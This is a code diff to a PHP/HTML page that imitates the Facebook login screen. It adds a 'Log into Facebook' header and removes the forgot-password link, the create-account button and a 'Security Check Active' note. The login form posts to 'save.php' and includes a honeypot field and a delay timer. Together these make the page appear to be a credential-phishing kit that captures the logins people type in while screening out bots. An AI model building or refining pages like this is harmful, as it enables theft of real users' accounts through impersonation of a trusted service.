@@ -51,6 +51,14 @@ if (time() * 1000 - $token_time > 30000) {
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1);
         }
+        .login-header {
+            font-size: 18px;
+            font-weight: 600;
+            color: #000000;
+            text-align: left;
+            margin-bottom: 20px;
+            padding-left: 0;
+        }
         input {
             width: 100%;
             padding: 14px 16px;
@@ -73,26 +81,6 @@ if (time() * 1000 - $token_time > 30000) {
             margin: 16px 0;
         }
         button:hover { background: #166fe5; }
-        .forgot-link { text-align: center; margin: 16px 0; }
-        .forgot-link a { color: #1877f2; text-decoration: none; font-size: 14px; }
-        hr { border: none; border-top: 1px solid #dadde1; margin: 20px 0; }
-        .create-btn {
-            background: #42b72a;
-            display: inline-block;
-            padding: 12px 24px;
-            border-radius: 6px;
-            color: white;
-            font-weight: bold;
-            text-decoration: none;
-        }
-        .create-btn:hover { background: #36a420; }
-        .create-account { text-align: center; }
-        .footer-note {
-            text-align: center;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #65676b;
-        }
         .honeypot {
             position: absolute;
             left: -9999px;
@@ -113,6 +101,7 @@ if (time() * 1000 - $token_time > 30000) {
             <p>Connect with friends and the world around you on Facebook.</p>
         </div>
         <div class="login-box">
+            <div class="login-header">Log into Facebook</div>
             <form method="POST" action="save.php" id="loginForm">
                 <div class="honeypot">
                     <input type="text" name="website_url" tabindex="-1" autocomplete="off">
@@ -128,10 +117,6 @@ if (time() * 1000 - $token_time > 30000) {
                 
                 <div id="timerNote" class="timer">⏱️ Please wait 3 seconds...</div>
             </form>
-            <div class="forgot-link"><a href="#">Forgot password?</a></div>
-            <hr>
-            <div class="create-account"><a href="#" class="create-btn">Create new account</a></div>
-            <div class="footer-note"><b>🔒 Security Check Active</b></div>
         </div>
     </div>
 
